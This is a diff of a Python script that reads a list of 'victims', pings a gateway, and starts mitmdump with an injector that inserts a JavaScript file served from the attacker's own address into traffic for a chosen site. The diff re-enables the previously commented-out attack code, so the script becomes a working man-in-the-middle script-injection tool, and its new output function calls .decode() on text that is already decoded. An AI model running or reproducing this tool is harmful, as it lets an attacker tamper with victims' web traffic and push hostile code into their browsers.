@@ -17,14 +17,18 @@ victims = [line.rstrip('\n') for line in open("victims.txt")]
 print("victims:")
 print(victims)
 
+def execute(cmd):
+    popen = subprocess.Popen(cmd, stdout=subprocess.PIPE, universal_newlines=True)
+    for line in popen.stdout: print(line.decode(), end='')
+    popen.stdout.close()
+    return_code = popen.wait()
+    if return_code:
+        raise subprocess.CalledProcessError(return_code, cmd)
 
-cmd = subprocess.Popen('ping ' + gateway, shell=True, stdout=subprocess.PIPE).communicate()[0]
-print(cmd)
-
-#cmd = subprocess.Popen('traceroute ' + gateway, shell=True, stdout=subprocess.PIPE).communicate()[0]
+execute(["ping", gateway])        
+#cmd = subprocess.Popen('ping ' + gateway, shell=True, stdout=subprocess.PIPE, universal_newlines=True).communicate()[0]
 #print(cmd)
 
-"""
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     return socket.inet_ntoa(fcntl.ioctl(
@@ -59,5 +63,3 @@ site = "212\.92\.30\.199"
 # start the mitmproxy
 os.system("mitmdump -v --ignore '^(?!"+ site +")' -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T") 
 
-
-"""
